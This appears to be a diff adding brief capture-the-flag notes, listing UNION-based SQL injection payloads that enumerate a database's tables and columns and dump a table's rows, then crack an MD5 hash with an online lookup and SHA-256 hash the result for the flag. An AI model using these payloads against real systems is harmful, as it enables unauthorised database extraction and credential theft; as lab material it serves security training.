@@ -1,0 +1,9 @@
+5 UNION SELECT null, database()
+
+5 UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() -> list_images
+
+5 UNION SELECT null, column_name FROM information_schema.columns WHERE table_schema=database()
+
+5 UNION SELECT null, concat(id, CHAR(10), url, CHAR(10), title, CHAR(10), comment) FROM users
+
+5ff9d0165b4f92b14994e5c685cdce28 -> https://md5decrypt.net/ -> FortyTwo -> lower all char -> fortytwo -> https://emn178.github.io/online-tools/sha256.html -> flag
